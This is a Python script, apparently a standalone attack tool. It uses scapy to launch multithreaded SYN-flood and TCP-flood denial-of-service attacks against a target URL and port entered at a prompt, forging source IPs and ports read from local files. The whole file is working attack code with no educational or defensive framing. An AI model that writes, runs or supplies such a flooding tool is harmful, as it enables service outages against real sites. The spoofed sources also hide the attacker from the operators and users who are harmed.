import random
import threading
from scapy.all import *
from urllib.parse import urlparse
import socket
import os

def syn_flood(target_ip, target_port, packet_count, spoofed_ips, spoofed_ports):
    for _ in range(packet_count):
        src_ip = random.choice(spoofed_ips)
        src_port = random.choice(spoofed_ports)
        ip_packet = IP(src=src_ip, dst=target_ip)
        tcp_packet = TCP(sport=src_port, dport=target_port, flags='S', seq=random.randint(1000, 9000))
        send(ip_packet/tcp_packet, verbose=0)

def tcp_flood(target_ip, target_port, packet_count, spoofed_ips, spoofed_ports):
    for _ in range(packet_count):
        src_ip = random.choice(spoofed_ips)
        src_port = random.choice(spoofed_ports)
        ip_packet = IP(src=src_ip, dst=target_ip)
        tcp_packet = TCP(sport=src_port, dport=target_port, flags='PA', seq=random.randint(1000, 9000)) / Raw(b"X" * 1024)
        send(ip_packet/tcp_packet, verbose=0)

def load_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def get_ip_from_url(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    return socket.gethostbyname(hostname)

def find_file(file_name):
    for root, dirs, files in os.walk("."):
        if file_name in files:
            return os.path.join(root, file_name)
    return None

def main():
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    target_ip = get_ip_from_url(target_url)
    target_port = int(input("Enter the target port (e.g., 80): "))
    packet_count = int(input("Enter the number of packets to send per thread: "))
    thread_count = int(input("Enter the number of threads to use: "))
    attack_type = input("Enter attack type (SYN/TCP): ").strip().upper()

    spoofed_ips_file = find_file("spoofed_ips.txt")
    if spoofed_ips_file is None:
        print("Error: Could not find 'spoofed_ips.txt' file.")
        return

    spoofed_ports_file = find_file("spoofed_ports.txt")
    if spoofed_ports_file is None:
        print("Error: Could not find 'spoofed_ports.txt' file.")
        return

    spoofed_ips = load_file(spoofed_ips_file)
    spoofed_ports = load_file(spoofed_ports_file)

    threads = []

    if attack_type == "SYN":
        attack_function = syn_flood
    elif attack_type == "TCP":
        attack_function = tcp_flood
    else:
        print("Error: Invalid attack type. Choose either SYN or TCP.")
        return

    for _ in range(thread_count):
        thread = threading.Thread(target=attack_function, args=(target_ip, target_port, packet_count, spoofed_ips, spoofed_ports))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f'Completed sending {packet_count * thread_count} packets to {target_ip}:{target_port}')

if __name__ == "__main__":
    main()
